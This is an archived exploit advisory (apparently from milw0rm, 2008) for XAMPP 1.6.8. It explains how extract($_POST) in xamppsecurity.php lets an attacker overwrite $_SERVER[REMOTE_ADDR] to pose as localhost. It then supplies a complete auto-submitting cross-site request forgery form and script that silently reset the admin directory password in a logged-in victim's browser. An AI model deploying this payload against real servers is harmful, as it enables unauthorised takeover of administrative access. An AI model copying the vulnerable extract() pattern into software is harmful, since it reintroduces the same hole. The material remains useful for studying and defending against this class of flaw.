<html><head><title>XAMPP 1.6.8 (XSRF) Change Administrative Password Exploit</title></head><pre>XAMPP change administrative password:
--------------------------------------------------------------------------------
Written by Michael Brooks
special thanks to str0ke

Affects XAMPP 1.6.8.
homepage: http://www.apachefriends.org/
XAMPP has 17+ million downloads from sourceforge.net.
register_globals=On or Off
This attack is exploitable even when this page is reporting a fully
secure system: http://10.1.1.10/security/index.php

There are two vulnerabilities that are being used toagther.
1)Global variable manipulation to spoof ip address.
2)XSRF to change the .htaccess password for http://10.1.1.10/security/
 and http://10.1.1.10/xampp/ .

The $_SERVER[REMOTE_ADDR] comes directly from Apache's tcp socket and
this cannot normally be spoofed.
However extract($_POST); can be used to overwrite any declared
variable,  including the $_SERVER superglobal.  This can be used to
&quot;spoof&quot;  your ip address as 127.0.0.1
This xsrf attack can be exploited from a browser in any ip address, so
long as that browser is currently authenticated.

This vulnerable code is from the very top of: /security/xamppsecurity.php
&lt;?php
       error_reporting(0);
       extract($_POST);
       extract($_SERVER);
       $host = &quot;127.0.0.1&quot;;
       $timeout = &quot;1&quot;;

       if ($REMOTE_ADDR) {
               if ($REMOTE_ADDR != $host) {
                       echo &quot;&lt;h2&gt; FORBIDDEN FOR CLIENT $REMOTE_ADDR &lt;h2&gt;&quot;;
                       exit;
               }
       }
//...

//Start of xsrf attack
&lt;html&gt;
	&lt;form action='http://10.1.1.10/security/xamppsecurity.php' method='POST' id=1&gt;
	          &lt;input type=&quot;hidden&quot; name=&quot;_SERVER[REMOTE_ADDR]&quot; value=&quot;127.0.0.1&quot;&gt;
		&lt;input type=hidden name=&quot;xamppuser&quot; value=admin &gt;
		&lt;input type=hidden name=&quot;xampppasswd&quot; value=password&gt;
		&lt;input type=hidden name=&quot;xamppaccess&quot; value=&quot;Make+safe+the+XAMPP+directory&quot;&gt;
		&lt;input type=submit&gt;
	&lt;/form&gt;
&lt;/html&gt;
&lt;script&gt;
	document.getElementById(1).submit();
&lt;/script&gt;
//End of xsrf attack

# milw0rm.com [2008-12-08]</pre></html>